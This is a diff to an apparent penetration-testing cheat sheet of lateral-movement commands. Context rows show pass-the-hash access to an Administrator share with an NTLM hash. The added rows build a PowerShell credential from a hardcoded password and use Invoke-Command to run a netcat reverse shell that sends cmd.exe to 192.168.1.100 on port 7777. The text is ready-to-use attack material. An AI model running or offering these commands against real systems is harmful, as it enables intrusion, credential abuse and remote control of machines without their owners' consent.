@@ -106,7 +106,14 @@
 | pth-smbclient -U WORKGROUP/Administrator%aad3b435b51404eeaad3b435b51404ee:C0F2E311D3F450A7FF2571BB59FBEDE5 //x.x.x.10/c$ |
 | pth-rpcclient -U WORKGROUP/Administrator%aad3b435b51404eeaad3b435b51404ee:C0F2E311D3F450A7FF2571BB59FBEDE5 //x.x.x.10 |
 
-
+| PowerShell Remoting |
+| ------------- |
+|$Username = 'ninja.corp\MeMe'|
+|$Password = '123456789aA'|
+|$pass= ConvertTo-SecureString -AsPlainText $Password -Force|
+|$Cred = New-Object System.Management.Automation.PSCredential -ArgumentList $Username,$pass|
+|Invoke-Command -ComputerName ninja.corp -Credential $Cred  -ScriptBlock {hostname}|
+|Invoke-Command -ComputerName ninja.corp -Credential $Cred  -ScriptBlock {cmd.exe /c nc.exe -v 192.168.1.100 7777 -e cmd.exe}|
 
 
 
